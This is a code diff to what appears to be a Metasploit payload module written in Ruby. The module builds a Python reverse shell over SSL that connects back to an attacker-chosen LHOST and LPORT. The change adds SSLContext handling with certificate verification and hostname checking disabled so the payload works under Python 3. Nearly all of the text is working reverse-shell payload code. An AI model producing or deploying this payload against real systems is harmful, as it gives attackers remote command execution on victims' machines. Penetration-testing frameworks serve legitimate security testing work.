@@ -51,11 +51,18 @@ module MetasploitModule
   def command_string
     cmd = ''
     dead = Rex::Text.rand_text_alpha(2)
-    # Set up the socket
+    # Set up the socket - use ssl.SSLContext for Python 3.2+ compatibility
+    # Fallback to ssl.wrap_socket for Python 2.x
     cmd += "import socket,subprocess,os,ssl\n"
     cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
     cmd += "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
-    cmd += "s=ssl.wrap_socket(so)\n"
+    cmd += "if hasattr(ssl,'SSLContext'):\n"
+    cmd += "\tctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\n"
+    cmd += "\tctx.check_hostname=False\n"
+    cmd += "\tctx.verify_mode=ssl.CERT_NONE\n"
+    cmd += "\ts=ctx.wrap_socket(so)\n"
+    cmd += "else:\n"
+    cmd += "\ts=ssl.wrap_socket(so)\n"
     # The actual IO
     cmd += "#{dead}=False\n"
     cmd += "while not #{dead}:\n"
